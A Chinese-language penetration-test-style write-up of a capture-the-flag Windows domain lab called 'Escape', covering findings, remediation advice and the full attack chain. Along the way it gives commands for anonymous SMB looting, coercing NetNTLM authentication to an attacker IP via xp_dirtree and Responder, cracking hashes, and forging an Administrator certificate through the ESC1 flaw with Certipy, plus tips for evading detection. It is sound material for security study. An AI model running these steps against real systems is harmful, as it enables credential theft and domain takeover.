## 1. 執行摘要 (Executive Summary)

### 測試範圍與目標：
1. 靶機名稱:Escape
2. 難度:Medium
3. IP:10.129.228.253

### 主要發現：
1. 漏洞 ：SMB服務允許匿名登入與明文憑證洩漏（風險等級：High）
2. 漏洞 ：內網MSSQL服務易受Responder攻擊導致服務帳號憑證外洩（風險等級：Medium）
3. 漏洞 ：日誌中明文憑證未清除乾淨導致橫向移動（風險等級：Medium）
4. 漏洞 ：ADCS憑證範本配置錯誤（ESC1漏洞）導致管理員憑證外洩（風險等級：Critical）

### 攻擊鏈摘要：

攻擊者首先透過SMB匿名登入 獲取初始憑證並登入MSSQL，隨後利用Responder進行內網毒化，成功截獲並破解服務帳號憑證。登入系統後，在SQL Server日誌中撈取到明文密碼並成功完成橫向移動。最後，攻擊者枚舉ADCS發現ESC1漏洞缺陷，直接向CA申請並偽造Administrator的PFX憑證，最終成功以網域管理員身份完全掌控網域。

### 潛在影響：

1. 完全喪失機密性與完整性：攻擊者已取得網域最高權限，可任意存取、修改或刪除網域內所有主機的敏感資料與商業機密。
2. 網域基礎設施淪陷：攻擊者可長駐於DC中、建立後門帳號，並將惡意控制延伸至企業內網的每一個角落。

### 修復建議：

1. 修復ADCS配置：立即全面審查憑證範本，關閉或嚴格限制允許自訂主體別名的範本權限，並開啟管理員審批機制。
2. 強化憑證與日誌管理：清理SQL Server相關日誌中的明文密碼，並導入憑證保險箱機制，避免帳號密碼硬編碼或紀錄於檔案中。
3. 關閉不安全協議：停用內網中不必要的協議以防禦Responder毒化攻擊；同時關閉SMB的匿名存取權限。

---

## 2. 技術發現與攻擊路徑詳述 (Findings)

### 2.1 資訊蒐集(Reconnaissance)

使用Nmap掃描開放服務
```bash
sudo nmap -sT -Pn --min-rate 1000 -p- 10.129.228.253 -oA portscan/ports
sudo nmap -sU -Pn --top-ports 20 10.129.228.253 -oA portscan/udp
sudo nmap -sT -Pn -sV -sC -O -p$ports 10.129.228.253 -oA portscan/detail
sudo nmap --script=vuln -p$ports 10.129.228.253 -oA portscan/vuln
```

<img width="699" height="630" alt="螢幕擷取畫面 2026-05-31 211647" src="https://github.com/user-attachments/assets/fcbf0250-dfee-42b3-90b9-d60b1d646d4f" />

<img width="631" height="560" alt="螢幕擷取畫面 2026-05-31 211712" src="https://github.com/user-attachments/assets/7e17e555-9b76-48a1-9c2c-5b6c122a4d9d" />

<img width="1476" height="809" alt="螢幕擷取畫面 2026-05-31 212444" src="https://github.com/user-attachments/assets/18a22d76-09ec-4d4f-a323-14980baf3172" />

<img width="1117" height="734" alt="螢幕擷取畫面 2026-05-31 212504" src="https://github.com/user-attachments/assets/0c488e88-2f5e-465c-8adf-6ddf2cee9aa7" />

<img width="926" height="225" alt="螢幕擷取畫面 2026-05-31 212516" src="https://github.com/user-attachments/assets/bb48132e-25a4-40aa-9d37-9bf37001806e" />

<img width="1383" height="692" alt="螢幕擷取畫面 2026-05-31 212538" src="https://github.com/user-attachments/assets/490dfc43-0096-44a9-bf8f-c40e4c8d2ae1" />

從掃描結果來看，123/UDP NTP服務是開啟的，可以使用該服務進行時間同步，詳細訊息掃描中可得知本機與靶機時間相隔快8小時
```bash
sudo ntpdate 10.129.228.253
```

<img width="814" height="100" alt="螢幕擷取畫面 2026-05-31 212757" src="https://github.com/user-attachments/assets/d412209c-18a3-484a-922c-3ffadc34a904" />

並且了解到相關的兩個網域名稱，記錄進/etc/hosts中

<img width="494" height="239" alt="螢幕擷取畫面 2026-05-31 212855" src="https://github.com/user-attachments/assets/ea041582-cd1f-4862-b3ab-05c2a6f810b8" />

開放服務中有開放SSL類服務，可以使用openssl來調查證書的來源
```bash
openssl s_client -showcerts -connect 10.129.228.253:3269 | openssl x509 -noout -text
```

<img width="858" height="735" alt="螢幕擷取畫面 2026-05-31 213115" src="https://github.com/user-attachments/assets/1d0efe7c-756c-44dc-a174-d59c299deac2" />


### 2.2 枚舉(Enumeration)

使用smbclient對SMB服務枚舉，這個工具可以模仿正常使用者流量，在管理員眼中相對正常
```bash
smbclient -L //19.129.228.253 -N
```

<img width="824" height="288" alt="螢幕擷取畫面 2026-05-31 213341" src="https://github.com/user-attachments/assets/35acb42b-25d4-4f53-95d4-3b7965e9d1ec" />

在Public共用資料夾中有一PDF檔，用get命令抓下來

```bash
smbclient //10.129.228.253/Public -N
```

<img width="1222" height="291" alt="螢幕擷取畫面 2026-05-31 213437" src="https://github.com/user-attachments/assets/38837011-3ccd-4f8e-a4fe-9cb355a861a5" />

這是關於SQL伺服器的資料，在資料最後有一組憑證，可以嘗試登入SQL服務(1433/TCP)

<img width="1588" height="751" alt="螢幕擷取畫面 2026-05-31 213636" src="https://github.com/user-attachments/assets/e5e7dc5f-fa2b-46e5-a669-44cc487f5eb9" />

<img width="1587" height="317" alt="螢幕擷取畫面 2026-05-31 213655" src="https://github.com/user-attachments/assets/31b3e169-84f2-458b-89ee-137d9fa9a89a" />


### 2.3 初始存取(Initial Access)

使用impacket-mssqlclient登入SQL服務

這個工具有很強大的提權功能，以及各種可以偷渡Linux命令的指令，缺點是特徵明顯，每款SQL連線工具在發起TDS握手時，都會宣告自己的程式名稱，例如正常使用者會宣告"Microsoft SQL Server Management Studio"、正常應用程式會宣告".Net SqlClient Data Provider"等等，而Impacket的工具預設會大剌剌地宣告自己是Impacket-MSSQLClient。

如果想要相對安靜的枚舉，可以使用微軟原生的sqlcmd，或是手動修改Impacket的原始碼，將宣告語句改為正常語句

```bash
impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@dc.sequel.htb
```

<img width="763" height="310" alt="螢幕擷取畫面 2026-05-31 213938" src="https://github.com/user-attachments/assets/2c3b2c9e-e53d-434d-90d3-0706e61ee1bf" />

我們只能枚舉出一些基本訊息，沒辦法進一部提權(後來了解其實是可以的，只是命令行會限定在這個工具裡面，我沒有嘗試)

<img width="657" height="158" alt="螢幕擷取畫面 2026-05-31 214222" src="https://github.com/user-attachments/assets/5b4d4e7e-d2df-4a5e-9e10-c5ee545e4428" />

當攻擊者掌握了某個服務的登入權限時，且該服務具備「讀取遠端檔案」或「發起網路連線」的功能，就可以嘗試強制身分驗證攻擊，又叫Responder攻擊

這是一種內網中間人攻擊。攻擊者透過監聽區域網路內的「找不到主機」的廣播請求，惡意冒充成該目標主機，藉此誘騙網絡中的Windows電腦進行身分驗證，進而竊取使用者的網域憑證雜湊值（NetNTLM Hash）

攻擊者利用資料庫的合法功能當作跳板，強迫SQL Server服務帳號主動向攻擊機發起連線，進而交出它的NetNTLM Hash

1. 在攻擊機啟動responder，攻擊機會在後台啟動一個假的SMB伺服器。
2. 透過impacket-mssqlclient執行命令，讓SQL Server去檢視某個資料夾，但目標是攻擊機上的網路共享路徑。
3. 因為目標是外部IP，SQL Server就會透過網路發起SMB協定連線到攻擊機。
4. Windows的內建安全機制啟動，執行SQL Server服務的那個操作系統帳號，就會自動把它的NetNTLMv2 Hash丟給Responder進行驗證。
5. Responder拒絕驗證，並把這串Hash直接攔截並印在螢幕上。

```bash
sudo responder -I tun0 -A //-A代表靜默模式
```
```mssql
EXEC xp_dirtree '\\10.10.14.154\share', 1, 1
```

<img width="533" height="738" alt="螢幕擷取畫面 2026-05-31 214802" src="https://github.com/user-attachments/assets/c552ac5d-556a-4c4e-9382-2791ecf6a0c2" />

<img width="706" height="84" alt="螢幕擷取畫面 2026-05-31 215032" src="https://github.com/user-attachments/assets/a05316e4-933d-4d1b-9f68-6d443019789a" />

<img width="1918" height="239" alt="螢幕擷取畫面 2026-05-31 215046" src="https://github.com/user-attachments/assets/cd784ae3-8bec-482a-b32b-35f3214d73e2" />

獲得Hash後丟給john破解密碼
```bash
john sql_svc_hash --wordlist=/usr/share/wordlists/rockyou.txt
```

<img width="914" height="207" alt="螢幕擷取畫面 2026-05-31 215235" src="https://github.com/user-attachments/assets/6a9ee9b1-4911-4190-a071-a14ec4aa899a" />

透過WinRM服務登入成功

```bash
evil-winrm -i 10.129.228.253 -u sql_svc -p REGGIE1234ronnie
```

<img width="1197" height="259" alt="螢幕擷取畫面 2026-05-31 215411" src="https://github.com/user-attachments/assets/f6002521-eaf5-45be-96fa-0be561beb35c" />

### 2.4 橫向移動(Lateral Movement)

簡單枚舉後得知有家目錄的使用者名單

<img width="583" height="245" alt="螢幕擷取畫面 2026-05-31 215559" src="https://github.com/user-attachments/assets/533ba3b2-8703-4284-a247-304480796030" />

C槽中有SQLServer的資料夾，其中有日誌檔，在日誌中找到明文密碼

<img width="630" height="304" alt="螢幕擷取畫面 2026-05-31 215649" src="https://github.com/user-attachments/assets/5828e3dd-2489-4b9c-b1a8-cbbbe4230f8f" />

<img width="1355" height="616" alt="螢幕擷取畫面 2026-05-31 215814" src="https://github.com/user-attachments/assets/666b233b-c13d-4c39-ad1c-163467141289" />

<img width="1519" height="142" alt="螢幕擷取畫面 2026-05-31 215856" src="https://github.com/user-attachments/assets/a85a2d50-1df9-4f6d-a037-96b7065b58db" />

再次使用WinRM服務遠端登入成功
```bash
evil-winrm -i 10.129.228.253 -u Ryan.Cooper -p NuclearMosquito3
```

<img width="1219" height="269" alt="螢幕擷取畫面 2026-05-31 220040" src="https://github.com/user-attachments/assets/238e6f6f-912a-403c-8441-69628cfbdf26" />

獲得user.txt

<img width="650" height="303" alt="螢幕擷取畫面 2026-05-31 220108" src="https://github.com/user-attachments/assets/6741e3b3-c124-45e1-b1b3-9adc52d4016d" />

### 2.5 權限提升(Privilege Escalation)

經過枚舉後並未獲得有用的提權方式

<img width="632" height="713" alt="螢幕擷取畫面 2026-05-31 220553" src="https://github.com/user-attachments/assets/340878fa-8c9d-4083-adf2-ea7fc9bf8098" />

因經過多方內部枚舉後無果，我開始針對ADCS進行枚舉，因為靶機有開啟SSL類服務，並且一開始使用openssl枚舉後，得知了內網有CA的存在。

在針對ADCS枚舉時，有幾個相對安靜且不落地的方式

1. 使用certutil命令，這是Windows內建的命令，設計是用來管理證書服務、備份和還原CA元件，以及檢驗憑證，但被賦予許多與安全、編碼、網路下載相關的進階功能，成為了最經典的LOLBIN。我在此不多作介紹，因為在靶機上實測時整個卡死了，顯然是出了某些狀況，而我並未選擇去處理，而是改用第二種工具
2. Certipy是針對ADCS的漏洞枚舉與利用工具，完全基於Python，且並大量依賴Impacket套件，可在攻擊機上運作。Certipy的運作原理非常精準且安靜，它只需要一次性對DC的LDAP服務的查詢連線。

```bash
certipy find -u Ryan.Cooper -p NuclearMosquito3 -dc-ip 10.129.228.253 -vulnerable
```

<img width="822" height="502" alt="螢幕擷取畫面 2026-05-31 222244" src="https://github.com/user-attachments/assets/821f9d29-3d75-4d66-beb8-4773ab0801ba" />

在產出報告的最下方可以看到有ESC1漏洞存在

<img width="799" height="718" alt="螢幕擷取畫面 2026-05-31 222531" src="https://github.com/user-attachments/assets/8e7d0e1c-8ce3-4802-b64c-034f9a7ca1c0" />

<img width="887" height="771" alt="螢幕擷取畫面 2026-05-31 222549" src="https://github.com/user-attachments/assets/22831881-25ee-460d-b5c9-2855d806a36f" />

ESC1漏洞是網域允許任何低權限的普通使用者申請憑證，並在申請時自由宣告自己是網域管理員，而CA會盲目核發，瞬間達成全網域淪陷，在網域內網中，一個憑證範本必須同時滿足以下四個設定，ESC1漏洞才會成立：

1. Enrollee Supplies Subject : True：允許憑證申請者在請求中，自行定義「使用者主體替代名稱（SAN）」
2. Enrollment Rights包含低權限使用者：該範本的ACL中，允許常規網域使用者群組進行註冊
3. 憑證用途包含用戶端身分驗證：該範本的延伸金鑰用途（EKU）包含Client Authentication、Smart Card Logon或PKINIT等，這代表這張憑證稍後可以用來登入Windows系統
4. 不需要管理員審批：申請送出後，CA伺服器會自動簽發並讓用戶直接下載

確認漏洞存在且可利用，直接向CA申請偽造為Administrator的PFX憑證

```bash
certipy req -u Ryan.Cooper -p NuclearMosquito3 -dc-ip 10.129.228.253 -ca sequel-DC-CA -template UserAuthentication -upn administrator@sequel.htb
```

<img width="1352" height="242" alt="螢幕擷取畫面 2026-05-31 222826" src="https://github.com/user-attachments/assets/af73dd1b-8478-41ad-bb40-98f3092b4944" />

在時間同步後，可利用PFX憑證，直接換取Administrator的NT Hash，時間若沒同步將直接失敗
```bash
sudo timedatectl set-ntp off //關閉Kali的網路自動時間同步
sudo ntpdate 10.129.228.253  //時間同步
certipy auth -pfx administrator.pfx -dc-ip 10.129.228.253
```

<img width="1011" height="419" alt="螢幕擷取畫面 2026-05-31 223132" src="https://github.com/user-attachments/assets/6c0861fc-4afb-407b-88ec-fa375481203a" />

導出Hash後利用WinRM直接登入管理員帳號成功

### 2.6 最終成果(Impact)

獲得root.txt

<img width="648" height="415" alt="螢幕擷取畫面 2026-05-31 223713" src="https://github.com/user-attachments/assets/7ab8c635-cf24-468f-8a7d-2039934d9b04" />


---

## 3. 學習回顧 (Lessons Learned)

### 成功的部分：
### 浪費時間的部分：
### 新知識點：
### 與實戰對應：
